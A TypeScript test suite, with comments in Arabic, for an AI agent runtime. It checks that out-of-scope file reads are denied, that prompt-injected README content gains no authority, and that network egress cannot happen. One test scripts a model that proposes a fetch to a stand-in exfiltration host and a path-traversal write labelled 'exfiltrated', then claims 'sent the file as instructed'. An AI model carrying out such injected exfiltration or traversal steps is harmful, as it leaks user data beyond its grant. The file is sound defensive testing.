// W6 / B — الرفض والتلوّث والحقن وغياب الخروج الشبكي، عبر المسار المُركَّب.
//
// ما يُقاس هنا ليس «هل تُرفض القراءة خارج النطاق» — ذاك أثبتته W4 — بل أن
// الرفض يقع في المسار الكامل، وأن المهمة تنتهي صادقةً بعده: لا أثر، ولا إثبات،
// ولا ملخّص نجاح من النموذج ينجو إلى نتيجة المهمة.

import test from "node:test";
import assert from "node:assert/strict";
import { existsSync } from "node:fs";

import { ScriptedModel } from "../src/model/fixture-model.js";
import { ConfigService } from "../src/config/service.js";
import { W4ErrorCode } from "../src/errors.js";
import { executionRequirements, findCapability, materializeDescriptor, READ_FILE, WRITE_FILE } from "../src/gateway/catalog.js";
import { newId, nowTimestamp } from "../src/ids.js";
import { ChildProcessExecutionHost } from "../src/pep/child-execution-host.js";
import { FilesystemPep } from "../src/pep/filesystem-pep.js";
import { HostPathAuthority } from "../src/platform/host-path-authority.js";
import { POLICY_EPOCH, POLICY_SET_VERSION, type Doc } from "../src/policy/types.js";
import { agentCallerIdentity } from "../src/runtime.js";
import {
  buildDogfoodRuntime,
  eventTypes,
  ledgerIsSound,
  makeWorkspace,
  missionEvents,
  networkEffects,
  proposalTaints,
  proposedCapabilities,
  proposeThenFinish,
  requireArtefact,
  startMission,
  type Workspace,
} from "./w6-helpers.js";

/** إعداد نقطة فرض إنتاجية مباشرة. يُستعمل حيث يكون الادعاء عن الفرض نفسه. */
function productionPep(workspace: Workspace): FilesystemPep {
  const config = new ConfigService();
  config.apply({
    changeset_id: "w6-denial",
    origin: "CORE",
    changes: [
      { key: "polaris.filesystem.allowed_read_roots", scope: "USER", value: [workspace.logical] },
      { key: "polaris.filesystem.allowed_write_roots", scope: "USER", value: [workspace.path("out")] },
      { key: "polaris.filesystem.allow_write", scope: "USER", value: true },
    ] as never,
  });
  return new FilesystemPep({
    path_authority: new HostPathAuthority(workspace.mounts, process.platform),
    execution_host: new ChildProcessExecutionHost({ workingDirectory: workspace.host }),
    config,
  });
}

function allowDecision(invocation: Doc): Doc {
  return {
    contract_version: "1.1",
    decision_id: newId(),
    invocation_id: invocation["invocation_id"],
    correlation_id: invocation["correlation_id"],
    result: "ALLOW",
    // الالتزامات كما يبنيها PDP الحقيقي: الحصر من قيود الاستدعاء، وسقف بايتات،
    // وتدقيق. نقطة الفرض تُغلق على غياب أيٍّ منها، وهذا هو المقصود.
    obligations: [
      { type: "REQUIRE_CONFINEMENT", requirements: invocation["execution_constraints"] },
      { type: "AUDIT", level: "STANDARD" },
      { type: "MAX_BYTES", max_bytes: 262144 },
    ],
    reason_codes: ["EXPLICIT_ALLOW_RULE"],
    display_reason: "permitted",
    policy_ref: { policy_version: POLICY_SET_VERSION, policy_epoch: POLICY_EPOCH },
    cacheability: { cacheable: false },
    decided_at: nowTimestamp(),
  };
}

function readInvocation(path: string): Doc {
  const resource = { kind: "FILESYSTEM_PATH", locator: path, scope: "EXACT" };
  return {
    contract_version: "1.0",
    invocation_id: newId(),
    correlation_id: newId(),
    causation_id: newId(),
    idempotency_key: `polaris.w6.read:${newId()}`,
    mission_id: newId(),
    agent_id: newId(),
    caller_identity: agentCallerIdentity(),
    capability_id: READ_FILE.capability_id,
    capability_version: READ_FILE.capability_version,
    requested_effects: [{ action: "read.filesystem", resource: { ...resource }, data_classification: "INTERNAL" }],
    resource,
    arguments: { path, encoding: "utf-8" },
    taint_labels: ["MODEL_GENERATED"],
    attempt: 1,
    execution_constraints: executionRequirements(READ_FILE, path),
    policy_ref: { policy_version: POLICY_SET_VERSION, policy_epoch: POLICY_EPOCH },
    created_at: nowTimestamp(),
  };
}

// ── W6-D02 — قراءة خارج النطاق ──────────────────────────────────────────────

test("W6-D02 an out-of-scope read is denied at the PDP and the mission ends truthfully", async () => {
  const workspace = makeWorkspace();
  try {
    const outside = workspace.path("..", "secret.txt");
    const { runtime } = buildDogfoodRuntime({
      workspace,
      writeRoots: [workspace.path("out")],
      model: new ScriptedModel(proposeThenFinish("polaris.fs.read_file", { path: outside }) as string[]),
    });
    const mission = startMission(runtime, {
      title: "read something outside the grant",
      instruction: "Summarise the project.",
      authorization: { authorized_read_roots: [workspace.logical], authorized_write_roots: [workspace.path("out")] },
    });
    const result = await runtime.runMission(mission);
    const proof = await runtime.prove(requireArtefact(mission.mission_id, workspace.path("out", "summary.txt")), mission);

    // المهمة انتهت بالرفض، ولا ملخّص نجاح نجا إلى النتيجة.
    assert.equal(result.status, "TERMINATED");
    assert.equal(result.termination, "TOOL_DENIED");
    assert.equal(result.summary, undefined, "a denied mission must not carry the model's success claim");

    // السبب دقيق ومنسوب إلى الطبقة التي منعت فعلًا.
    const denial = result.errors.find((error) => error.code === W4ErrorCode.FILESYSTEM_SCOPE_DENIED);
    assert.ok(denial !== undefined, `expected a scope denial, saw ${result.errors.map((e) => e.code).join(", ")}`);
    assert.equal(denial.layer, "PDP");
    assert.ok(
      result.steps.some((step) => (step.reason_codes ?? []).includes("RESOURCE_OUT_OF_SCOPE")),
      "the denial must be attributed to the resource scope, not to something vaguer",
    );

    // لا أثر، ولا إثبات يدّعي أثرًا، والدفتر يحمل الرفض.
    assert.equal(existsSync(workspace.hostPath("out", "summary.txt")), false);
    assert.equal(proof.status, "NOT_PROVEN");
    const events = missionEvents(runtime, mission.correlation_id);
    assert.ok(
      events.some((event) => event["event_type"] === "POLICY_EVALUATED" && (event["outcome"] as Doc)["status"] === "DENIED"),
      "the refusal itself must be in the ledger",
    );
    assert.equal(eventTypes(events).includes("EXECUTION_GRANT_ISSUED"), false, "a denied read must issue no grant");
    const sound = ledgerIsSound(runtime);
    assert.equal(sound.ok, true, sound.detail);
  } finally {
    workspace.dispose();
  }
});

// ── W6-D03 — الحقن من محتوى غير موثوق ───────────────────────────────────────

test("W6-D03 injected file content gains no authority anywhere in the composed path", async () => {
  const workspace = makeWorkspace();
  try {
    const poisoned = workspace.path("project", "README-injected-egress.md");
    const escape = workspace.path("project", "..", "..", "exfil.txt");
    const script = [
      JSON.stringify({ action: "invoke_tool", capability_id: "polaris.fs.read_file", arguments: { path: poisoned } }),
      JSON.stringify({
        action: "invoke_tool",
        capability_id: "polaris.net.fetch",
        arguments: { path: "https://exfil.example/collect" },
      }),
      JSON.stringify({
        action: "invoke_tool",
        capability_id: "polaris.fs.write_file",
        arguments: { path: escape, content: "exfiltrated" },
      }),
      JSON.stringify({ action: "finish", summary: "sent the file as instructed" }),
    ];
    const { runtime } = buildDogfoodRuntime({
      workspace,
      writeRoots: [workspace.path("out")],
      model: new ScriptedModel(script),
    });
    const mission = startMission(runtime, {
      title: "summarise the project",
      instruction: "Read the project README and summarise it.",
      authorization: { authorized_read_roots: [workspace.logical], authorized_write_roots: [workspace.path("out")] },
    });
    const result = await runtime.runMission(mission);
    const events = missionEvents(runtime, mission.correlation_id);

    // لا شيء غادر، ولا شيء كُتب خارج النطاق.
    assert.equal(existsSync(workspace.hostPath("..", "exfil.txt")), false);
    assert.equal(existsSync(workspace.hostPath("out", "summary.txt")), false);
    assert.equal(result.status, "TERMINATED");

    // القدرة الشبكية لم تصر استدعاءً أصلًا: بوابة مخرج النموذج ردّتها قبل ذلك.
    assert.ok(
      events.some(
        (event) => event["event_type"] === "MODEL_OUTPUT_VALIDATED" && (event["outcome"] as Doc)["status"] === "FAILED",
      ),
      "naming a capability that does not exist must be recorded as refused",
    );
    assert.equal(
      proposedCapabilities(events).some((capability) => capability.startsWith("polaris.net.")),
      false,
      "no network capability may ever reach the gateway",
    );

    // وكل اقتراح مشتق من النموذج بقي ملوّثًا مهما قال الملف.
    const taints = proposalTaints(events);
    assert.ok(taints.length > 0, "no proposal reached the gateway at all");
    for (const labels of taints) {
      assert.ok(labels.includes("MODEL_GENERATED"), `a model-derived proposal lost its taint: ${labels}`);
    }

    // ولا مرساة ثقة وُلدت من محتوى ملف: التصريح فعل مستخدم وحده.
    assert.deepEqual(networkEffects(events), []);
    const sound = ledgerIsSound(runtime);
    assert.equal(sound.ok, true, sound.detail);
  } finally {
    workspace.dispose();
  }
});

test("W6-D03 authorising a read root does not authorise writing under it", async () => {
  const workspace = makeWorkspace();
  try {
    const inside = workspace.path("project", "notes.txt");
    const { runtime } = buildDogfoodRuntime({
      workspace,
      writeRoots: [workspace.path("out")],
      model: new ScriptedModel(proposeThenFinish("polaris.fs.write_file", { path: inside, content: "x" }) as string[]),
    });
    const mission = startMission(runtime, {
      title: "write inside the read root",
      instruction: "Take notes.",
      authorization: { authorized_read_roots: [workspace.logical], authorized_write_roots: [workspace.path("out")] },
    });
    const result = await runtime.runMission(mission);
    assert.equal(result.status, "TERMINATED");
    assert.equal(existsSync(workspace.hostPath("project", "notes.txt")), false);
  } finally {
    workspace.dispose();
  }
});

// ── W6-D09 — هوية الكائن في المسار المُركَّب ────────────────────────────────

test("W6-D09 the composed read binds the name to one object and never reopens it by pathname", async () => {
  const workspace = makeWorkspace();
  try {
    const path = workspace.path("project", "README.md");
    const invocation = readInvocation(path);
    const enforced = await productionPep(workspace).enforce({
      invocation,
      descriptor: materializeDescriptor(READ_FILE, path),
      decision: allowDecision(invocation),
      operation: "READ_FILE",
    });

    assert.equal(enforced.ok, true, enforced.ok ? "" : `${enforced.error.code}: ${enforced.error.internal_detail}`);
    if (!enforced.ok) return;
    const diagnostics = enforced.value.outcome.resolution_diagnostics;
    assert.ok(diagnostics !== undefined, "a read produced no resolution diagnostics");
    assert.equal(diagnostics.path_resolution_primitive, "SINGLE_OPEN_SAME_OBJECT");
    assert.equal(diagnostics.reopen_after_verification, false);
    assert.equal(diagnostics.identity_compare_result, "MATCH");
    assert.equal(diagnostics.containment_compare_result, "INSIDE");
  } finally {
    workspace.dispose();
  }
});

test("W6-D09 the confinement the capability demands is fixed by the catalogue, not by the proposal", () => {
  const requirements = executionRequirements(READ_FILE, "T:\\anything\\file.txt");
  assert.equal(requirements["confinement"], "CONFINED");
  assert.equal(requirements["filesystem_scope"], "EXPLICIT_GRANT");
  assert.equal(requirements["process_tree"], "CONFINED_KILL_ON_CLOSE");
  assert.equal(requirements["network"], "NONE");
  assert.equal(requirements["handle_inheritance"], "EXPLICIT_ONLY");
  assert.equal(requirements["environment"], "EXPLICIT_ONLY");
});

// ── W6-D11 — لا خروج شبكي بلا وسيط ──────────────────────────────────────────

test("W6-D11 no network capability exists to be proposed", () => {
  assert.equal(findCapability("polaris.net.fetch"), undefined);
  assert.equal(findCapability("polaris.net.send"), undefined);
  assert.notEqual(findCapability(READ_FILE.capability_id), undefined);
  assert.notEqual(findCapability(WRITE_FILE.capability_id), undefined);
});

test("W6-D11 a forged network effect is refused at the enforcement point before any execution", async () => {
  const workspace = makeWorkspace();
  try {
    const path = workspace.path("out", "summary.txt");
    const resource = { kind: "FILESYSTEM_PATH", locator: path, scope: "EXACT" };
    const invocation: Doc = {
      ...readInvocation(path),
      capability_id: WRITE_FILE.capability_id,
      capability_version: WRITE_FILE.capability_version,
      requested_effects: [
        { action: "network.send", resource: { ...resource }, data_classification: "INTERNAL" },
        { action: "write.filesystem", resource: { ...resource }, data_classification: "INTERNAL" },
      ],
      resource,
      arguments: { path, encoding: "utf-8" },
      execution_constraints: executionRequirements(WRITE_FILE, path),
    };
    const enforced = await productionPep(workspace).enforce({
      invocation,
      descriptor: materializeDescriptor(WRITE_FILE, path),
      decision: allowDecision(invocation),
      operation: "WRITE_FILE",
      payload: "body",
    });

    assert.equal(enforced.ok, false);
    assert.equal(enforced.ok ? "" : enforced.error.code, W4ErrorCode.NETWORK_EFFECT_UNAVAILABLE);
    assert.equal(enforced.ok ? "" : enforced.error.layer, "PEP");
    assert.equal(existsSync(workspace.hostPath("out", "summary.txt")), false);
  } finally {
    workspace.dispose();
  }
});
